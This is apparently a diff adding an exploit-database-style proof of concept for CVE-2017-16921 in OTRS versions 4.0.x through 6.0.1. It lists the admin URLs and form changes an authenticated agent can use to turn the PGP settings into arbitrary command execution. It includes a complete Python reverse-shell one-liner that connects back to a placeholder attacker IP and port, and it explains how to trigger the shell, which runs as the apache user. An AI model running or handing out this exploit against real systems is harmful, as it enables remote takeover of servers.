@@ -1,0 +1,42 @@
+# Exploit Title: OTRS Shell Access 
+# Date: 21-01-2018
+# Exploit Author: Bæln0rn
+# Vendor Homepage: https://www.otrs.com/
+# Software Link: http://ftp.otrs.org/pub/otrs/
+# Version: 4.0.1 - 4.0.26, 5.0.0 - 5.0.24, 6.0.0 - 6.0.1
+# Tested on: OTRS 5.0.2/CentOS 7.2.1511
+# CVE : CVE-2017-16921
+
+CVE-2017-16921: 
+"In OTRS 6.0.x up to and including 6.0.1, OTRS 5.0.x up to and including 5.0.24, and OTRS 4.0.x up to and including 4.0.26, an attacker who is logged into OTRS as an agent can manipulate form parameters (related to PGP) and execute arbitrary shell commands with the permissions of the OTRS or web server user."
+
+OTRS 5.0.2 PoC:
+1. Authenticate to an agent account. <path>/index.pl
+
+2. Open "Admin" tab. <path>/index.pl?Action=Admin
+
+3. Open "SysConfig" link. <path>/index.pl?Action=AdminSysConfig
+
+4. Find the "Crypt:PGP" subgroup. <path>/index.pl?Action=AdminSysConfig;Subaction=Edit;SysConfigSubGroup=Crypt%3A%3APGP;SysConfigGroup=Framework
+
+5. Manipulate form parameters and use "Update" button to save:
+
+"PGP"
+-Default: No
+-New: Yes
+
+"PGP::Bin"
+-Default: /usr/bin/gpg 
+-New: <shell command including executables the webserver user has execute permissions for, no options>
+-PoC (Reverse Python Shell): /usr/bin/python
+
+"PGP::Options"
+-Default: --homedir /opt/otrs/.gnupg/ --batch --no-tty --yes
+-New: <any command options>
+-PoC (Reverse Python Shell): -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<YOURIP>",<YOURLISTENINGPORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+6. Open "Admin" tab. <path>/index.pl?Action=Admin
+
+7. Open "PGP Keys" to execute saved command.  <path>/index.pl?Action=AdminPGP
+
+Behavior will vary based on commands. The above PoC opened a stable, no TTY, reverse shell under the "apache" user. The page eventually timed out with a 502 error, but the web application seems otherwise unaffected.  Killing the shell before timeout advances the web application to the proper "PGP Management" page. The exploit can be repeated unlimited times with step #7 above.
